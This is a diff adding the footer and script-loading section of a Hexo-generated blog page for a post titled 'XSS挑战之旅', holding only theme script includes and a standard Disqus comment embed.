+  <span class="with-love">
+    <i class="fa fa-snowflake-o"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">EkEk</span>
+
+  
+</div>
+
+
+  <div class="powered-by">由 <a class="theme-link" target="_blank" href="https://hexo.io">Hexo</a> 强力驱动</div>
+
+
+
+
+
+
+
+
+        
+
+
+
+
+
+
+
+        
+      </div>
+    </footer>
+
+    
+
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+  
+
+  
+  
+    <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+  
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.4"></script>
+
+
+
+  
+  
+
+
+  <script type="text/javascript" src="/js/src/affix.js?v=5.1.4"></script>
+
+  <script type="text/javascript" src="/js/src/schemes/pisces.js?v=5.1.4"></script>
+
+
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.4"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.4"></script>
+
+
+
+  
+
+
+  
+
+    
+      <script id="dsq-count-scr" src="https://jeremyekek-github-io.disqus.com/count.js" async></script>
+    
+
+    
+      <script type="text/javascript">
+        var disqus_config = function () {
+          this.page.url = 'https://jeremyekek.github.io/2019/05/20/XSS挑战之旅/';
+          this.page.identifier = '2019/05/20/XSS挑战之旅/';
+          this.page.title = 'XSS挑战之旅';
+        };
+        var d = document, s = d.createElement('script');
+        s.src = 'https://jeremyekek-github-io.disqus.com/embed.js';
+        s.setAttribute('data-timestamp', '' + +new Date());
+        (d.head || d.body).appendChild(s);
+      </script>
+    
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+  
+
+  
+
+  
+  
+
+  
+
+  
+
+  
+
+</body>
+</html>
